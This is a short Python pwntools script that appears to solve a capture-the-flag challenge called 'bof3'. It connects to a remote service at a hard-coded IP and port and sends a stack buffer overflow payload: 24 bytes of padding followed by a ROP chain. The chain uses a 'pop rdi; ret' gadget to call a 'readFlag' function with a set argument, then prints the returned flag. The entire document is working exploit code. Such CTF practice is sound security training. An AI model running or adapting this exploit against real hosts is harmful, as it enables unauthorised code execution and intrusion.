#nc 13.214.30.13 10004

from pwn import *

host, port = '13.214.30.13', '10004'

context.binary = binary = './bof3'
vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)

# p = process("./bof3")

# print(vuln_elf.symbols['readFlag'])
p = remote(host, port)

# pop_rdi = 0x0000000000401383
# param = 0xcabecabe
# readFlag = 0x00000000004011f6

payload = b'A'*24
# payload += p64(pop_rdi) + p64(param) + p64(readFlag)
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(0xcabecabe)
payload += p64(vuln_elf.symbols['readFlag'])

p.recvline()
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
flag = p.recvuntil(b'}').decode()
p.close()

print(flag)
